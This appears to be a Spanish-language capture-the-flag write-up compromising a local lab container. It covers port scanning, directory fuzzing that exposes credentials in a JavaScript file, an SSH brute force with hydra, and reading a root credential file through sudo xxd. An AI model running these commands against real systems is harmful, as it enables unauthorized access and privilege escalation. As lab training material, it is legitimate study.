<img width="538" height="287" alt="image" src="https://github.com/user-attachments/assets/9717e11e-c200-4db3-874f-e7b97b6bccdf" />


Esacaneo de puertos y servicios 

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 10:16 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:ea:92:ba:53:e3:b8:dc:71:95:50:19:87:6b:b2:6d (ECDSA)
|_  256 fa:77:68:76:dc:8e:b1:cd:56:5f:c1:79:89:ad:fa:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xC2\xBFQu\xC3\xA9 son las DevTools del Navegador?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds
```

vemos puerto 22 y 80 levantados, asi que comienzo chequeando el servicio web

Esto es lo que vemos al entrar al puerto 80

<img width="1272" height="762" alt="image" src="https://github.com/user-attachments/assets/ec678b15-e21c-4cbf-81b0-78c87052e3e1" /> 

Solicita credenciales para continuar, asi que aplico fuzzing web

```ruby
feroxbuster -u 'http://172.17.0.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2/
 🚩  In-Scope Url          │ 172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       22l       72w      765c http://172.17.0.2/backupp.js
200      GET      107l      508w    62608c http://172.17.0.2/1.png
200      GET       77l      401w    45307c http://172.17.0.2/2.png
200      GET       78l      398w    42336c http://172.17.0.2/4.png
200      GET      137l      709w    81631c http://172.17.0.2/3.png
200      GET      134l      442w     4548c http://172.17.0.2/
200      GET      134l      442w     4548c http://172.17.0.2/index.html
```

Veo algo interesante que me llama la atencion como el backupp.js iremos que nos encontramos  

<img width="791" height="466" alt="image" src="https://github.com/user-attachments/assets/adb3e5da-c4c4-4b5f-a67e-f38edb00c431" />

vemos unas credenciales con esto es mas que suficiente para login en la pagina principal 

<img width="1278" height="762" alt="image" src="https://github.com/user-attachments/assets/a5b974a0-6d1d-48c5-8109-6401c0d76583" />


mas alla de un breve tutorial acerca de DevTools no hay mas nada de interes, pero si detallamos el script .js vemos una password antigua, pero al probarla con lo que podria ser el user chocolate via ssh no son credenciales validas, asi que aplico un ataque de fuerza bruta con hydra al servicio ssh

```ruby
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p baluleroh ssh://172.17.0.2
```
<img width="1703" height="226" alt="image" src="https://github.com/user-attachments/assets/90d3434f-e72d-41c9-8c8c-c72833790600" />

obtenemos credenciales para el servicio ssh

```ruby
ssh carlos@172.17.0.2
```

<img width="797" height="224" alt="image" src="https://github.com/user-attachments/assets/f641778b-513d-40d6-8c87-f662a1a2a3fc" />


# Escalando privilegios 

   # Carlos 
No existen mas usuarios en el sistema, pero vemos que es posible ejecutar el binario xxd y ping como root

   <img width="978" height="130" alt="image" src="https://github.com/user-attachments/assets/df4b5a80-45e6-48c7-90a7-9e83973e7268" />
y tambien observamos una nota que habla de un Backup en el directorio de root asi que podria leerlo con el binario xxd

```ruby
sudo /usr/bin/xxd /root/data.bak

00000000: 726f 6f74 3a62 616c 756c 6572 6974 6f0a  root:balulerito.
```

obtenemos credenciales para root asi que escalamos

<img width="556" height="34" alt="image" src="https://github.com/user-attachments/assets/1c3dc843-0c7b-48dd-ad31-a6554fd110bf" />



Ya con esto podremos ser usuario  root


<img width="358" height="82" alt="image" src="https://github.com/user-attachments/assets/b3aefe7e-0224-4fd9-9ae2-ef69e9e77774" />
